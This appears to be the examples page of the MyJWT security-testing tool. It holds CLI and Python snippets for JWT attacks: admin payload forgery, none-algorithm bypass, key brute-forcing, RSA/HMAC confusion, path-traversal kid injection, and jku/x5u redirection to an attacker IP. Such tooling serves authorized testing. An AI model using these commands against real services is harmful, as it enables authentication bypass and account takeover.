# Examples
- [Modify Your jwt](#modify-your-jwt)
- [None Vulnerabilty Check](#none-vulnerability)
- [Sign Key](#sign-key)
- [Brute Force Signature](#brute-force)
- [RSA/HMAC Confusion](#rsahmac-confusion)
- [Kid Injection](#kid-injection)
- [Send your new Jwt to url](#send-your-new-jwt-to-url)
- [Jku Vulnerability](#jku-vulnerability)
- [X5u Vulnerability](#x5u-vulnerability)
## Modify your Jwt
### CLI
```
myjwt YOUR_JWT --add-payload "username=admin" --add-header "refresh=false"
```
### Code
```
from MyJWT.modifyJWT import addpayload, addheader, changePayload
from MyJWT.utils import jwtToJson, SIGNATURE, encodeJwt

jwtJson = jwtToJson(jwt)
jwtJson = addheader(jwtJson, {"kid": "001"})
jwtJson = changePayload(jwtJson, {"username": "admin"})
jwt = encodeJwt(jwtJson) + "." + jwtJson[SIGNATURE]
```
Full example here: [01-modify-jwt](https://github.com/mBouamama/MyJWT/blob/master/examples/01-modify-jwt/main.py)
## None Vulnerability
### CLI
```
myjwt YOUR_JWT --none-vulnerability
```
### CODE
```
from MyJWT.utils import jwtToJson, SIGNATURE
from MyJWT.vulnerabilities import noneVulnerability
jwtJson = jwtToJson(jwt)
jwt = noneVulnerability(encodeJwt(jwtJson) + "." + jwtJson[SIGNATURE])
```
Full example here: [02-none-vulnerability](https://github.com/mBouamama/MyJWT/blob/master/examples/02-none-vulnerability/main.py)
## Sign Key
### CLI
```
myjwt YOUR_JWT --sign YOUR_KEY
```
### CODE
```
from MyJWT.modifyJWT import signature
from MyJWT.utils import jwtToJson
key = "test"
jwt = signature(jwtToJson(jwt), key)
```
Full example here: [03-sign-key](https://github.com/mBouamama/MyJWT/blob/master/examples/03-sign-key/main.py)
## Brute Force
### CLI
```
myjwt YOUR_JWT --bruteforce PATH
```
### CODE
```
from MyJWT.vulnerabilities import bruteforceDict
wordlist = "../../wordlist/common_pass.txt"
key = bruteforceDict(jwt, wordlist)
```
Full example here: [04-brute-force](https://github.com/mBouamama/MyJWT/blob/master/examples/04-brute-force/main.py)
## RSA/HMAC Confusion
### CLI
```
myjwt YOUR_JWT --hmac FILE
```
### CODE
```
from MyJWT.vulnerabilities import confusionRsaHmac
file = "public.pem"
jwt = confusionRsaHmac(jwt, file)
```
Full example here: [05-rsa-hmac-confusion](https://github.com/mBouamama/MyJWT/blob/master/examples/05-rsa-hmac-confusion/main.py)
## Kid Injection
### CLI
```
myjwt YOUR_JWT --kid INJECTION
```
### Code
```
from MyJWT.modifyJWT import signature
from MyJWT.utils import jwtToJson
from MyJWT.vulnerabilities import injectSqlKid

injection = "../../../../../../dev/null"
sign = ""
jwt = injectSqlKid(jwt, injection)
jwt = signature(jwtToJson(jwt), sign)
```
Full example here: [06-kid-injection](https://github.com/mBouamama/MyJWT/blob/master/examples/06-kid-injection/main.py)

## Send your new Jwt to url

### CLI
```
myjwt YOUR_JWT -u YOUR_URL -c "jwt=MY_JWT" --non-vulnerability --add-payload "username=admin"
```

## Jku Vulnerability
### CLI
```
myjwt YOUR_JWT --jku YOUR_URL
```
### Code
```
from MyJWT.vulnerabilities import jkuVulnerability
newJwt = jkuVulnerability(jwt=jwt, url="MYPUBLIC_IP")
print(jwt)
```
Full example here: [07-jku-bypass](https://github.com/mBouamama/MyJWT/blob/master/examples/07-jku-bypass/main.py)
## X5U Vulnerability
### CLI
```
myjwt YOUR_JWT --x5u YOUR_URL
```
### Code
```
from MyJWT.vulnerabilities import x5uVulnerability
newJwt = x5uVulnerability(jwt=jwt, url="MYPUBLIC_IP")
print(jwt)
```
Full example here: [08-x5u-bypass](https://github.com/mBouamama/MyJWT/blob/master/examples/08-x5u-bypass/main.py)
